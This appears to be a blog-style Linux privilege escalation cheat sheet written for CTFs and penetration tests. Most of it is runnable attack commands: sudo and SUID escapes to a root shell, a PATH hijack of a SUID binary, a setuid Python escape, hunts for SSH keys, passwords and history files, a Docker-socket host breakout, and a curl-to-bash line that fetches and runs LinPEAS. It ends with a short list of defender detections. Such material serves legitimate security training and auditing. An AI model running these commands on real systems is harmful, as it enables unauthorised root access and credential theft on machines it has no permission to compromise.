---
title: "Linux Privilege Escalation Cheat Sheet (2026)"
slug: "linux-privilege-escalation-cheat-sheet"
description: "From low-priv shell to root on modern Linux — enumeration commands, sudo abuse, SUID/capabilities tricks, and the post-LinPEAS workflow that actually wins."
date: 2026-04-19T11:00:00Z
lastmod: 2026-04-19T11:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["Tutorials"]
tags: ["linux", "privilege escalation", "post exploitation", "pentest"]
keywords: ["linux privesc", "linux privilege escalation", "linpeas"]
toc: true
cover:
  image: "/images/articles/linux-privilege-escalation-cheat-sheet.png"
  alt: "Linux privilege escalation cheat sheet"
---

You have a low-privilege shell. Now what? This cheat sheet is the ordered, opinionated checklist that solves the privesc step on most CTFs and audits.

## 0. Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
stty raw -echo; fg     # back in your terminal: stty rows X cols Y
```

A broken shell wastes hours.

## 1. The Triple Enumeration

```bash
id; whoami; groups
hostname; uname -a; cat /etc/os-release
cat /proc/version
```

The kernel version determines applicable kernel exploits. Group memberships (`disk`, `docker`, `lxd`, `adm`) are often instant wins.

## 2. Sudo Abuse — Always Check First

```bash
sudo -l
```

If you see **NOPASSWD** entries, head to [GTFOBins](https://gtfobins.github.io/) and look up each binary. Every common UNIX tool has a `sudo` escape there.

```bash
# Example: sudo /usr/bin/find allowed
sudo find . -exec /bin/bash \; -quit
```

## 3. SUID / SGID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

Cross-reference each against GTFOBins. Custom SUID binaries are common privesc vectors:

```bash
# Hijack via PATH
strings /usr/local/bin/backup       # uses 'tar' without full path
echo '#!/bin/bash' > /tmp/tar
echo 'bash -p' >> /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup                # tar runs from /tmp, with SUID
```

## 4. Linux Capabilities

The modern replacement for SUID; equally dangerous when misconfigured.

```bash
getcap -r / 2>/dev/null
```

Look for:

```text
/usr/bin/python3 = cap_setuid+ep   # game over
/usr/bin/perl    = cap_setuid+ep   # game over
/usr/bin/tar     = cap_dac_read_search+ep   # read every file
```

Python escape:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## 5. Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers
```

Look for:

- Scripts owned by root but **writable by your user or group**
- Scripts that call binaries by basename, exploitable via PATH
- Scripts that include directories you can write into

## 6. Writable Paths the Root Process Uses

Even without cron, services running as root that read your-writable files are golden:

```bash
# Find files you can write that root reads
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null
```

Common: `/etc/passwd` (writable on broken systems), Python virtualenvs, `.bash_profile` of an admin who occasionally `su -`s in.

## 7. Sensitive Files

```bash
# History files
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Application credentials
grep -ir "password" /etc/ 2>/dev/null
grep -ir "API_KEY" /var/www/ 2>/dev/null
cat /var/lib/mysql/mysql/user.MYD 2>/dev/null
```

## 8. Kernel Exploits — Last Resort

Identify exact kernel:

```bash
uname -r
```

Then search the dirty-cow style live archive for that version. CVE candidates that still appear on misconfigured production boxes:

- **CVE-2022-0847 (Dirty Pipe)** — Linux 5.8 to 5.16.11
- **CVE-2021-4034 (PwnKit)** — almost every Linux distribution before 2022
- **CVE-2023-32233** — Linux netfilter (5.x through 6.3.1)

Kernel exploits crash machines. Use them last.

## 9. Containers and Sandbox Breakouts

Inside a Docker container:

```bash
# Are we privileged?
ls -la /.dockerenv
cat /proc/self/status | grep CapEff

# Mounted host paths?
mount | grep "type ext"

# Docker socket exposed?
ls -la /var/run/docker.sock
```

A mounted Docker socket usually means: `docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host`.

## 10. Automated Tools

Run these *after* you've thought through the box by hand:

- [LinPEAS](https://github.com/peass-ng/PEASS-ng) — best one-shot enumerator
- [LinEnum](https://github.com/rebootuser/LinEnum) — simpler, smaller output
- [GTFOBins](https://gtfobins.github.io/) — sudo/SUID escape cheat sheet

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

## Detection (For Defenders)

- `auditd` rules on `execve` of SUID binaries
- Sysmon for Linux on `process_creation` with `Image=/usr/bin/sudo`
- File integrity monitoring on `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
- Capability monitoring with eBPF tools (`bpftrace`)

## References

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PEASS-ng](https://github.com/peass-ng/PEASS-ng)
